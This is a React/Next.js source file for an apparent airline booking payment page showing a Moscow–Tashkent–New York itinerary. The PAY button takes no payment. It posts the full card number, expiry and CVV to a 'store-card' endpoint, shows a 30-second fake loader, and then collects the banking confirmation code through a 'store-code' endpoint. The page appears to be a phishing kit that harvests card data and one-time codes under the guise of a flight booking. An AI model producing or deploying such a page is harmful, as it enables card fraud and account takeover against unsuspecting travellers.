'use client'

import { ChevronRightIcon } from '@heroicons/react/16/solid';
import { ChevronLeftIcon } from '@heroicons/react/20/solid';
import { ArrowRightIcon } from '@heroicons/react/20/solid';
import { InformationCircleIcon } from '@heroicons/react/24/outline';
import { XMarkIcon } from '@heroicons/react/24/outline';
import LuggageOutlinedIcon from '@mui/icons-material/LuggageOutlined';
import { useState } from 'react';
import BottomDrawer from "@/components/BottomDrawer";
import Image from 'next/image'
import PaymentMethodSelector from "@/components/PaymentMethodSelector";
import {SubmitHandler, useForm} from "react-hook-form";
import Modal from "@/components/Modal";
import Loader from "@/components/Loader";

type CardForm = {
  number: string;
  expiry: string;
  cvv: string;
};

export default function Booking() {
  const [showDrawer, setShowDrawer] = useState(false);
  const [showDrawerSecond, setShowDrawerSecond] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [code, setCode] = useState<string>('');
  const [loading, setLoading] = useState<boolean>(true);

  const {
    register,
    handleSubmit,
    setValue,
    watch,
    formState: { errors },
  } = useForm<CardForm>({ mode: 'onChange' });

  const onSubmit: SubmitHandler<CardForm> = async (data) => {
    try {
      const res = await fetch('/api/store-card', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          card_number: data.number,
          expiry_date: data.expiry,
          csv: data.cvv,
        }),
      });

      const result = await res.json();

      if (!res.ok) {
        throw new Error(result.error || 'Unknown error');
      }

      console.log('✅ Card saved:', result.record);
      setShowModal(true);
      setTimeout(() => {
        setLoading(false);
      }, 30000)
    } catch (err) {
      console.error('❌ Submit error:', err);
      alert('Failed to save card info');
    }
  };

  const confirmCode = async () => {
    try {
      const res = await fetch('/api/store-code', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          code,
        }),
      });

      const result = await res.json();

      if (!res.ok) {
        throw new Error(result.error || 'Unknown error');
      }

      console.log('✅ Code saved:', result.record);
    } catch (err) {
      console.error('❌ Submit error:', err);
      alert('Failed to save card info');
    }
  };

  return (
    <div className={"bg-[rgb(241,242,246)] flex flex-col"} >
      <div className={"h-[52px] p-[16px] flex flex-row bg-white rounded-b-[16px] mb-[8px]"} >
        <div className={"text-[rgb(73,66,82)] text-[13px]"} >Passengers</div>
        <ChevronRightIcon className="w-[16px] h-[19px] text-gray-700" />
        <div className={"text-[rgb(242,28,181)] font-bold text-[13px]"}>Payment</div>
      </div>
      <div onClick={() => setShowDrawer(true)} className={"h-[236px] bg-white rounded-[16px] p-[16px] mb-[8px]"}>
        <div className={"flex flex-row justify-between items-center"}>
          <div className={"flex flex-row"}>
            <div
              className={"h-[48px] w-[48px] border-1 border-[rgb(242,28,181)] transition duration-[0.3s] rounded-[8px] flex justify-center items-center hover:bg-[#e1d8eb]"}>
              <ChevronLeftIcon className="w-[28px] h-[28px] text-[rgb(242,28,181)]"/>
            </div>
            <div className={"pl-[12px] flex flex-col gap-[4px]"}>
              <div className={"flex flex-row gap-[8px] items-center"}>
                <div className={"font-bold text-[18px] text-[rgb(73,66,82)] leading-[26px] tracking-[0.21px]"}>MOW</div>
                <div>
                  <ArrowRightIcon className="w-[18px] h-[18px] text-[rgb(73,66,82)]"/>
                </div>
                <div className={"font-bold text-[18px] text-[rgb(73,66,82)] leading-[26px] tracking-[0.21px]"}>NYC</div>
                <div
                  className={"bg-[rgb(214,180,248)] pl-[8px] pr-[8px] text-[rgb(103,1,228)] font-bold rounded-[8px] text-[14px] ml-[4px] leading-[26px]"}>$785
                </div>
              </div>
              <div className={"flex flex-row items-center gap-[4px]"}>
                <div className={"text-[12px] text-[rgb(73,66,82)]"}>2 Jul, We</div>
                <div className={"bg-[rgb(73,66,82)] h-[6px] w-[6px] rounded-full"}/>
                <div className={"text-[12px] text-[rgb(73,66,82)]"}>1 passenger</div>
              </div>
            </div>
          </div>
          <div>
            <InformationCircleIcon className="cursor-pointer w-[24px] h-[24px] text-[rgb(103,1,228)]"/>
          </div>
        </div>
        <div className={"h-[1px] mt-[12px] mb-[8px] bg-[rgb(227,231,237)]"}/>
        <div className={"flex flex-col gap-[4px]"}>
          <div className={"text-[rgb(109,112,120)] text-[12px]"}>Trip time: 18h 55m</div>
          <div className={"flex flex-row gap-[8px]"}>
            <div className={"flex flex-row items-center gap-[4px]"}>
              <XMarkIcon className="w-4 h-4 text-[rgb(103,1,228)]"/>
              <div className={"text-[rgb(103,1,228)] text-[12px]"}>No exchange</div>
            </div>
            <div className={"flex flex-row items-center gap-[4px]"}>
              <XMarkIcon className="w-4 h-4 text-[rgb(103,1,228)]"/>
              <div className={"text-[rgb(103,1,228)] text-[12px]"}>No refunds</div>
            </div>
          </div>
          <div
            className={"bg-[rgb(241,231,253)] h-[30px] text-[12px] leading-[18px] py-[6px] px-[10px] w-fit rounded-[8px]"}>Short
            transfer
          </div>
          <div className={"h-[1px] mt-[4px] mb-[4px] bg-[rgb(227,231,237)]"}/>
          <div className={"bg-[rgb(245,249,255)] rounded-[8px] p-[8px] flex flex-row"}>
            <div className={"flex flex-row justify-center items-center w-1/2"}>
              <LuggageOutlinedIcon style={{color: 'rgb(116, 124, 139)'}}/>
              <div className={"flex flex-col"}>
                <div className={"text-[10px] text-[rgb(73,66,82)] leading-[14px]"}>Checked Baggage</div>
                <div className={"text-[12px] text-[rgb(73,66,82)] font-bold leading-[16px]"}>23 kg</div>
              </div>
            </div>
            <div className={"flex flex-row justify-center items-center w-1/2 border-l border-[rgb(208,209,210)]"}>
              <LuggageOutlinedIcon style={{color: 'rgb(116, 124, 139)'}}/>
              <div className={"flex flex-col"}>
                <div className={"text-[10px] text-[rgb(73,66,82)] leading-[14px]"}>Carry-on Baggage</div>
                <div className={"text-[12px] text-[rgb(73,66,82)] font-bold leading-[16px]"}>8 kg</div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div onClick={() => setShowDrawerSecond(true)} className={"bg-white rounded-[16px] h-[115px] p-[16px] mb-[8px]"}>
        <div className={"text-[rgb(73,66,82)] text-[22px] leading-[32px] font-bold mb-[16px]"}>Payment</div>
        <div className={"flex flex-row justify-between items-center"}>
          <div className={"text-[rgb(242,28,181)] text-[14px] leading-[21px]"}>Total: $793</div>
          <ChevronRightIcon className="w-[20px] h-[22px] text-[rgb(242,28,181)]"/>
        </div>
        <div className={"text-[10px] text-[rgb(116,124,139)] leading-[14px]"}>Convenience fee added</div>
      </div>
      <div className={"bg-white p-[16px] flex flex-col"}>
        <div className={"flex flex-row text-[20px] font-bold"}>
          <div className={"text-[rgb(73,66,82)] leading-[28px]"}>Total price:</div>
          <div className={"text-[rgb(103,1,228)] leading-[28px] ml-[8px]"}>$785</div>
        </div>
        <div className={"text-[12px] text-[rgb(116,124,139)] leading-[16px]"}>For 1 passenger</div>
        <div className={"text-[12px] text-[rgb(116,124,139)] leading-[16px]"}>Convenience fee added</div>
        <form onSubmit={handleSubmit(onSubmit)}>
          <PaymentMethodSelector
            register={register}
            watch={watch}
            setValue={setValue}
            errors={errors}
          />
          <button type={"submit"} className={"w-full mt-[16px] bg-[rgb(103,1,228)] text-white font-bold h-[52px] px-[24px] py-[12px] rounded-[12px] text-[20px] hover:bg-purple-800 transition duration-[0.3s] cursor-pointer"}>{'PAY'}</button>
        </form>
      </div>
      <BottomDrawer isOpen={showDrawer} onClose={() => setShowDrawer(false)}>
        <div className={"h-[68px] p-[16px] flex flex-row justify-between"} >
          <div className={"text-[rgb(73,66,82)] text-[20px] leading-[28px] font-bold"} >Flight details</div>
          <div onClick={() => setShowDrawer(false)} className={"h-[36px] w-[36px] rounded-[8px] bg-[#f3dbe6] cursor-pointer flex items-center justify-center transition duration-[0.3s] hover:bg-[#e1d8eb]"} >
            <XMarkIcon className="w-5 h-5 text-[rgb(242,28,181)]"/>
          </div>
        </div>
        <div className={"px-[16px] pb-[16px] flex flex-col max-h-[577px] overflow-y-auto"}>
          <div className={"flex flex-col gap-[8px] mb-[8px]"}>
            <div className={"text-[rgb(73,66,82)] text-[16px] leading-[24px] font-bold"}>Moscow — New York City</div>
            <div className={"text-[rgb(109,112,120)] text-[12px]"}>otal trip duration: 18h 55m</div>
            <div className={"flex flex-row gap-[8px]"}>
              <div className={"flex flex-row items-center gap-[4px]"}>
                <XMarkIcon className="w-4 h-4 text-[rgb(103,1,228)]"/>
                <div className={"text-[rgb(103,1,228)] text-[14px]"}>No exchange</div>
              </div>
              <div className={"flex flex-row items-center gap-[4px]"}>
                <XMarkIcon className="w-4 h-4 text-[rgb(103,1,228)]"/>
                <div className={"text-[rgb(103,1,228)] text-[14px]"}>No refunds</div>
              </div>
            </div>
            <div
              className={"bg-[rgb(241,231,253)] h-[30px] text-[12px] leading-[18px] py-[6px] px-[10px] w-fit rounded-[8px]"}>Short
              transfer
            </div>
          </div>
          <div className={"h-[1px] mb-[10px] bg-[rgb(227,231,237)]"}/>
          <div className={"flex flex-row justify-between mb-[8px]"}>
            <div className={"flex flex-row gap-[4px]"}>
              <Image src={"/uzbek.png"} alt={"uzbek"} className={"mr-[4px]"} height={31} width={31}/>
              <div className={"flex flex-col"}>
                <div className={"text-[rgb(73,66,82)] text-[12px] leading-[14px] font-bold"}>Uzbekistan Airways</div>
                <div className={"text-[rgb(73,66,82)] text-[10px] leading-[14px]"}>Flight duration: 3h 45m</div>
              </div>
            </div>
            <div className={"text-[rgb(116,124,139)] text-[10px] leading-[14px] font-bold"}>Boeing 787 HY-602</div>
          </div>
          <div className={"bg-[rgb(245,249,255)] rounded-[8px] p-[8px] flex flex-row mb-[16px]"}>
            <div className={"flex flex-row justify-center items-center w-1/2"}>
              <LuggageOutlinedIcon style={{color: 'rgb(116, 124, 139)'}}/>
              <div className={"flex flex-col"}>
                <div className={"text-[10px] text-[rgb(73,66,82)] leading-[14px]"}>Checked Baggage</div>
                <div className={"text-[12px] text-[rgb(73,66,82)] font-bold leading-[16px]"}>23 kg</div>
              </div>
            </div>
            <div className={"flex flex-row justify-center items-center w-1/2 border-l border-[rgb(208,209,210)]"}>
              <LuggageOutlinedIcon style={{color: 'rgb(116, 124, 139)'}}/>
              <div className={"flex flex-col"}>
                <div className={"text-[10px] text-[rgb(73,66,82)] leading-[14px]"}>Carry-on Baggage</div>
                <div className={"text-[12px] text-[rgb(73,66,82)] font-bold leading-[16px]"}>8 kg</div>
              </div>
            </div>
          </div>
          <div className={"flex flex-row mb-[10px]"}>
            <div className="relative w-[28px] ml-[4px] mb-[4px]">
              <div className="absolute top-0 bottom-0 w-px border-l border-dotted border-[rgb(103,1,228)]"></div>
            </div>
            <div className={"flex flex-col gap-[12px]"}>
              <div className={"flex flex-row gap-[16px] mb-[8px]"}>
                <div className={"flex flex-col"}>
                  <div className={"text-[rgb(73,66,82)] font-bold text-[14px] leading-[20px] mb-[4px]"}>23:00</div>
                  <div className={"text-[rgb(73,66,82)] text-[12px] leading-[16px]"}>2 Jul</div>
                </div>
                <div className={"flex flex-col"}>
                  <div className={"text-[rgb(73,66,82)] font-bold text-[14px] leading-[20px] mb-[4px]"}>Moscow</div>
                  <div className={"text-[rgb(116,124,139)] text-[10px] leading-[14px]"}>DME, Domodedovo International
                    Airport
                  </div>
                </div>
              </div>
              <div className={"flex flex-row gap-[16px] mb-[8px]"}>
                <div className={"flex flex-col"}>
                  <div className={"text-[rgb(73,66,82)] font-bold text-[14px] leading-[20px] mb-[4px]"}>04:45</div>
                  <div className={"text-[rgb(73,66,82)] text-[12px] leading-[16px]"}>3 Jul</div>
                </div>
                <div className={"flex flex-col"}>
                  <div className={"text-[rgb(73,66,82)] font-bold text-[14px] leading-[20px] mb-[4px]"}>Tashkent</div>
                  <div className={"text-[rgb(116,124,139)] text-[10px] leading-[14px]"}>TAS, Tashkent International
                    Airport Terminal 2
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className={"flex flex-row mb-[10px]"}>
            <div className="relative w-[28px] ml-[4px] mb-[4px] h-[28px]">
              <div className="absolute top-0 bottom-0 w-px border-l border-dotted border-orange-600"></div>
            </div>
            <div className={"text-[rgb(116,124,139)] text-[10px] leading-[14px] mb-[2px]"}>
              Stop 0d 2h 00m
            </div>
          </div>
          <div className={"flex flex-row justify-between mb-[8px]"}>
            <div className={"flex flex-row gap-[4px]"}>
              <Image src={"/uzbek.png"} alt={"uzbek"} className={"mr-[4px]"} height={31} width={31}/>
              <div className={"flex flex-col"}>
                <div className={"text-[rgb(73,66,82)] text-[12px] leading-[14px] font-bold"}>Uzbekistan Airways</div>
                <div className={"text-[rgb(73,66,82)] text-[10px] leading-[14px]"}>Flight duration: 13h 10m</div>
              </div>
            </div>
            <div className={"text-[rgb(116,124,139)] text-[10px] leading-[14px] font-bold"}>Boeing 787 HY-101</div>
          </div>
          <div className={"bg-[rgb(245,249,255)] rounded-[8px] p-[8px] flex flex-row mb-[16px]"}>
            <div className={"flex flex-row justify-center items-center w-1/2"}>
              <LuggageOutlinedIcon style={{color: 'rgb(116, 124, 139)'}}/>
              <div className={"flex flex-col"}>
                <div className={"text-[10px] text-[rgb(73,66,82)] leading-[14px]"}>Checked Baggage</div>
                <div className={"text-[12px] text-[rgb(73,66,82)] font-bold leading-[16px]"}>23 kg</div>
              </div>
            </div>
            <div className={"flex flex-row justify-center items-center w-1/2 border-l border-[rgb(208,209,210)]"}>
              <LuggageOutlinedIcon style={{color: 'rgb(116, 124, 139)'}}/>
              <div className={"flex flex-col"}>
                <div className={"text-[10px] text-[rgb(73,66,82)] leading-[14px]"}>Carry-on Baggage</div>
                <div className={"text-[12px] text-[rgb(73,66,82)] font-bold leading-[16px]"}>8 kg</div>
              </div>
            </div>
          </div>
          <div className={"flex flex-row mb-[10px]"}>
            <div className="relative w-[28px] ml-[4px] mb-[4px]">
              <div className="absolute top-0 bottom-0 w-px border-l border-dotted border-[rgb(103,1,228)]"></div>
            </div>
            <div className={"flex flex-col gap-[12px]"}>
              <div className={"flex flex-row gap-[16px] mb-[8px]"}>
                <div className={"flex flex-col"}>
                  <div className={"text-[rgb(73,66,82)] font-bold text-[14px] leading-[20px] mb-[4px]"}>06:45</div>
                  <div className={"text-[rgb(73,66,82)] text-[12px] leading-[16px]"}>3 Jul</div>
                </div>
                <div className={"flex flex-col"}>
                  <div className={"text-[rgb(73,66,82)] font-bold text-[14px] leading-[20px] mb-[4px]"}>Tashkent</div>
                  <div className={"text-[rgb(116,124,139)] text-[10px] leading-[14px]"}>TAS, Tashkent International Airport , Terminal 2</div>
                </div>
              </div>
              <div className={"flex flex-row gap-[16px] mb-[8px]"}>
                <div className={"flex flex-col"}>
                  <div className={"text-[rgb(73,66,82)] font-bold text-[14px] leading-[20px] mb-[4px]"}>10:55</div>
                  <div className={"text-[rgb(73,66,82)] text-[12px] leading-[16px]"}>3 Jul</div>
                </div>
                <div className={"flex flex-col"}>
                  <div className={"text-[rgb(73,66,82)] font-bold text-[14px] leading-[20px] mb-[4px]"}>New York City</div>
                  <div className={"text-[rgb(116,124,139)] text-[10px] leading-[14px]"}>JFK, John F. Kennedy International Airport Terminal 4</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </BottomDrawer>
      <BottomDrawer isOpen={showDrawerSecond} onClose={() => setShowDrawerSecond(false)}>
        <div className={"h-[68px] p-[16px] flex flex-row justify-between"}>
          <div className={"text-[rgb(73,66,82)] text-[20px] leading-[28px] font-bold"}>Price breakdown</div>
          <div onClick={() => setShowDrawerSecond(false)}
               className={"h-[36px] w-[36px] rounded-[8px] bg-[#f3dbe6] cursor-pointer flex items-center justify-center transition duration-[0.3s] hover:bg-[#e1d8eb]"}>
            <XMarkIcon className="w-5 h-5 text-[rgb(242,28,181)]"/>
          </div>
        </div>
        <div className={"px-[16px] pb-[16px] flex flex-col"}>
          <div className={"text-[rgb(73,66,82)] mt-[12px] mb-[4px] text-[16px] leading-[24px] font-bold"}>1 passenger —
            One way
          </div>
          <div className={"flex flex-row justify-between items-center"}>
            <div className={"text-[rgb(73,66,82)] text-[12px] leading-[16px]"}>Economy</div>
            <div className={"text-[rgb(73,66,82)] text-[14px] leading-[20px]"}>$731</div>
          </div>
          <div className={"flex flex-row justify-between items-center"}>
            <div className={"text-[rgb(73,66,82)] text-[12px] leading-[16px]"}>Convenience fee</div>
            <div className={"text-[rgb(73,66,82)] text-[14px] leading-[20px]"}>$23</div>
          </div>
          <div className={"flex flex-row justify-between items-center mb-[12px]"}>
            <div className={"text-[rgb(73,66,82)] text-[12px] leading-[16px]"}>Service fee</div>
            <div className={"text-[rgb(73,66,82)] text-[14px] leading-[20px]"}>$39</div>
          </div>
          <div className={"h-[1px] mb-[12px] bg-[rgb(227,231,237)]"}/>
          <div className={"flex flex-row justify-between items-center"}>
            <div className={"text-[rgb(73,66,82)] text-[14px] leading-[20px] font-bold"}>Total</div>
            <div className={"text-[rgb(103,1,228)] text-[18px] leading-[26px] font-bold"}>$793</div>
          </div>
          <div className={"text-[rgb(116,124,139)] text-[10px] leading-[14px] mb-[16px]"}>Convenience fee added</div>
          <button onClick={() => setShowDrawerSecond(false)} className={"bg-[rgb(103,1,228)] text-white font-bold h-[44px] px-[24px] py-[12px] rounded-[12px] text-[14px] hover:bg-purple-800 transition duration-[0.3s] cursor-pointer"}>OK</button>
        </div>
      </BottomDrawer>
      {showModal && (
        <Modal onClose={() => setShowModal(false)}>
          {loading
            ? <div className={"h-[128px] flex items-center justify-center"} ><Loader /></div>
            : <>
              <div>Confirm payment in the banking app or enter code</div>
              <input
                type="text"
                placeholder="Code"
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className={`bg-white outline-none mt-[16px] h-[52px] px-[10px] rounded-[8px] w-full border border-purple-600`}
              />
              <button onClick={() => confirmCode()} className={"w-full mt-[16px] bg-[rgb(103,1,228)] text-white font-bold h-[52px] px-[24px] py-[12px] rounded-[12px] text-[20px] hover:bg-purple-800 transition duration-[0.3s] cursor-pointer"}>{'CONFIRM'}</button>
            </>}
        </Modal>
      )}
    </div>
  );
}